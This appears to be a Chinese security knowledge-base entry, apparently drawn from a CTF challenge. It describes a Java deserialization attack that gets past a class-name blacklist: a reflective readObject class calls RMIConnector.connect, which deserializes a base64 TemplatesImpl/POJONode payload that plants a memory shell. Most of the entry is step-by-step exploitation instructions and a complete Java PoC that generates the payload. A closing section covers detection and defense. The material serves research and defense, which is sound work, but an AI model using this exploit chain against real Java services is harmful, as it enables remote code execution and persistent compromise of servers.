---
id: web-java-deser-readobject-reflection-rmiconnector-secondary
title: 自定义 readObject 反射调用 + RMIConnector 二次反序列化绕过黑名单
type: scenario
domain: web
path: web/java/deserialization
technique: readobject-reflection-rmiconnector-secondary-deser
tags:
- java
- deserialization
- blacklist-bypass
- secondary-deserialization
- rmiconnector
- templatesimpl
- pojonode
- memshell
- jdk
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:12:39+08:00'
  notes: 已对照原文核对链构造：外层 YouFindThis.readObject 反射调用 RMIConnector.connect(Map)，JMXServiceURL urlPath=/stub/<base64> 触发 RMIConnector 内部反序列化，内层 POJONode(TemplatesImpl)+BadAttributeValueExpException 经 Jackson 序列化触发 getOutputProperties/newTransformer。外层类名不命中 safeSer 黑名单、内层 payload 藏于 base64 字符串，绕过成立。原文只给出最终 exp 与“访问 evil?cmd=whoami 即可执行”的文字结论、无成功截图，故 confidence=medium 合理；会受 JEP290 全局过滤器/JDK 模块封装影响。原文未涉及版本区间。未执行 PoC。
url: /docs/web/java/deserialization/web-java-deser-readobject-reflection-rmiconnector-secondary/
draft: false
kb_aliases:
- 二次反序列化绕过黑名单
- RMIConnector.connect 反序列化
- YouFindThis 链
- ObjectInputStream resolveClass 绕过
- 黑名单绕过内存马投递
---

## 一句话结论

当应用的 `ObjectInputStream` 子类只重写 `resolveClass` 做类名黑名单、且类路径上存在“可序列化且 `readObject` 会反射调用任意一参方法”的类时，可先用未被拦截的该类调用 `RMIConnector.connect(Map)`，借 RMIConnector 内部对 `JMXServiceURL` 中 `/stub/<base64>` 的反序列化，把被黑名单拦截的 Jackson/TemplatesImpl payload 作为内层流投递，实现二次反序列化绕过。

## 原理

- 常见的 `ObjectInputStream` 黑名单在 `resolveClass(ObjectStreamClass)` 中检查类名，命中即抛异常。它只约束当前这条流；如果某个反序列化入口在方法内部新建 `ObjectInputStream` 读取另一段字节流，新的流不会继承外层子类的 `resolveClass` 覆盖，内层 payload 便绕过了黑名单。
- `RMIConnector`（`javax.management.remote.rmi.RMIConnector`）的 `connect(Map)` 会解析 `JMXServiceURL`；当 URL 为 `service:jmx:rmi://` 且 `urlPath` 形如 `/stub/<base64>` 时，它会把该 Base64 解码并作为 `RMIServer` stub 反序列化。这个反序列化发生在 `connect()` 内部，使用 JDK 自己的流，因此外层应用的 `resolveClass` 黑名单完全不参与。
- 触发 `connect(Map)` 需要一个能调用任意方法的载体。若应用自带可序列化类，其 `readObject()` 执行 `aClass.getMethod(methed, argclass).invoke(input, args)`，攻击者把 `aClass` 设为 `RMIConnector.class`、`methed` 设为 `connect`、`argclass` 设为 `Map.class`、`input` 设为构造好的 `RMIConnector`，反序列化时即自动调用 `connect(null)`。
- 内层 payload 可用 Jackson 的 `POJONode` 包裹 `TemplatesImpl`，外层套 `BadAttributeValueExpException`：反序列化触发 `toString()`，`POJONode` 的节点序列化逻辑用 Jackson 序列化 `TemplatesImpl`，Bean 序列化器反射调用 `getOutputProperties()` → `newTransformer()` → 加载 `_bytecodes` 中的字节码并执行静态初始化，完成 RCE。
- 因为 `TemplatesImpl`、Jackson、Spring 等类名只出现在内层 base64 字符串里，外层流的类名只有 `YouFindThis`、`RMIConnector`、`JMXServiceURL` 等未命中黑名单的类，黑名单不会被触发。

## 触发条件

- 应用对不可信数据调用 `ObjectInputStream.readObject()`，并用子类重写 `resolveClass` 做类名黑名单（而非 JEP 290 全局 `jdk.serialFilter` 或 `ObjectInputFilter`）。
- classpath 中存在一个可序列化、且 `readObject()`/`toString()` 等入口会反射调用任意一参方法的类（原文为应用自带的 `YouFindThis`）。
- JDK 自带 `javax.management.remote.rmi.RMIConnector`（管理模块存在且未被裁剪）。
- classpath 中存在 Jackson（提供 `POJONode`）与可用的 `TemplatesImpl`/`TrAXFilter`；目标 JDK 未强封装内部 Xalan 类。
- 目标允许把 payload 写入可反序列化入口（如上传 `.ref`/序列化文件）。

## 利用步骤

1. 审计 `ObjectInputStream` 子类：确认它只在 `resolveClass` 做黑名单，未使用 JEP 290 过滤器，也未在每次 `new ObjectInputStream` 时合并策略。
2. 寻找可序列化且能调用任意方法的业务类：`readObject` 中对 `Class`/`Method`/参数做反射 `invoke` 的类最优；记下方法签名与字段。
3. 准备内层 payload：用 Javassist 生成 `AbstractTranslet` 子类（内存马注册逻辑放在构造器/静态块中），构造 `TemplatesImpl` 并设置 `_name`、`_bytecodes`（如内部类需一并放入二维数组）、`_tfactory`。
4. 用 `POJONode` 包裹 `TemplatesImpl`，放入 `BadAttributeValueExpException` 的 `val` 字段，序列化得到内层 Base64。
5. 构造 `JMXServiceURL("service:jmx:rmi://")`，反射把 `urlPath` 设为 `/stub/<内层Base64>`，再构造 `RMIConnector(url, null)`。
6. 构造外层载体：把 `aClass=RMIConnector.class`、`argclass=Map.class`、`methed="connect"`、`args=null`、`input=RMIConnector` 填入可序列化反射类，序列化并投递。
7. 反序列化触发 `RMIConnector.connect(null)` → 内层 stub 反序列化 → TemplatesImpl 字节码执行；随后访问内存马路径验证。

## PoC

```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        // 1. 读取内存马字节码（含内部类 Evil，需一起放入 _bytecodes）
        byte[] bt  = readAll("InjectClass.class");
        byte[] bt2 = readAll("InjectClass$Evil.class");

        // 2. 内层 sink：TemplatesImpl + POJONode + BadAttributeValueExpException
        TemplatesImpl tpi = new TemplatesImpl();
        setField(tpi, "_name", "test");
        setField(tpi, "_bytecodes", new byte[][]{bt, bt2});
        setField(tpi, "_tfactory", new TransformerFactoryImpl());

        POJONode pj = new POJONode(tpi);
        BadAttributeValueExpException bb = new BadAttributeValueExpException(null);
        setField(bb, "val", pj);

        String inner = base64(serialize(bb));

        // 3. 把内层 payload 塞进 JMXServiceURL 的 stub 路径
        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://");
        setField(url, "urlPath", "/stub/" + inner);
        RMIConnector connector = new RMIConnector(url, null);

        // 4. 外层载体：反序列化时反射调用 RMIConnector.connect(Map)
        YouFindThis outer = new YouFindThis();
        outer.aClass = RMIConnector.class;
        outer.argclass = Map.class;
        outer.methed = "connect";
        outer.args = null;
        outer.input = connector;

        System.out.println(base64(serialize(outer)));
    }

    static byte[] readAll(String path) throws IOException {
        File f = new File(path);
        byte[] b = new byte[(int) f.length()];
        try (FileInputStream in = new FileInputStream(f)) { in.read(b); }
        return b;
    }

    static void setField(Object o, String name, Object v) throws Exception {
        java.lang.reflect.Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, v);
    }

    static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos)) { out.writeObject(o); }
        return bos.toByteArray();
    }

    static String base64(byte[] b) {
        return java.util.Base64.getEncoder().encodeToString(b);
    }
}
```

```text
# 应用侧可序列化反射类（原文类名），仅示意被利用的入口：
#   class YouFindThis implements Serializable {
#       Class aClass; Class argclass; Object input; String methed; Object args;
#       private void readObject(ObjectInputStream ois) { ois.defaultReadObject(); POFP(); }
#       void POFP() { aClass.getMethod(methed, argclass).invoke(input, args); }
#   }
#
# 外层流只出现 YouFindThis / RMIConnector / JMXServiceURL 等未命中黑名单的类；
# 内层 TemplatesImpl / POJONode / Jackson 类名藏在 base64 字符串中，不经过外层 resolveClass。
```

## 变体与关联

- 变体：`RMIConnector` 可换成其它“方法内部反序列化”的 JDK/框架类，例如 `SignedObject.getObject()`、`BadAttributeValueExpException` 嵌套流、`JdbcRowSetImpl` 等；本质都是寻找新的 `ObjectInputStream` 构造点。
- 变体：外层方法调用载体不一定是业务类，任何 `readObject`/`equals`/`hashCode`/`toString` 中能反射调用任意方法的类都可使用。
- 变体：内层 sink 可换成 CC6、Jackson 其它 gadget、JNDI 等；只要内层流不受外层黑名单约束即可。
- 关联：[[web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass]]（嵌套 `ObjectInputStream` 绕过 JEP 290 外层过滤的同类问题）；[[web-java-framework-spring-mvc-pathpattern-memshell]]（本链最终投递的内存马形态之一）。
- 边界：本链只绕过应用级 `resolveClass` 黑名单；若目标设置了 JVM 全局 `jdk.serialFilter` 或通过 `ObjectInputFilter`/`SerialFilterFactory` 在每次 `new ObjectInputStream` 时合并策略，内层仍会被过滤。`RMIConnector` 被裁剪、`TemplatesImpl` 被模块强封装、或业务类不可序列化/不存在时链路不成立。原 PoC 依赖 CTF 题目自带的反射类，通用环境需自行寻找等价 gadget；置信度为 medium。

## 检测与防御

- 检测：审计 `ObjectInputStream` 子类的 `resolveClass`，标记“只做类名黑名单、未用 JEP 290”的实现；监控反序列化后调用 `RMIConnector.connect`、`SignedObject.getObject` 等内部反序列化方法；序列化流中出现 `/stub/`、`JMXServiceURL.urlPath` 内嵌 Base64 的异常结构。
- 修复：不要依赖类名黑名单；使用 JEP 290 `ObjectInputFilter` 白名单，并通过 `setSerialFilterFactory` 让每个新 `ObjectInputStream` 继承全局策略。
- 加固：升级 JDK 并限制 `javax.management`/Xalan 内部类的使用；消除不必要的原生反序列化入口；对上传的序列化文件做魔数与结构检测。
- 响应：重启进程清除内存马；结合 heap dump 检查 `RequestMappingHandlerMapping` 与异常类加载。
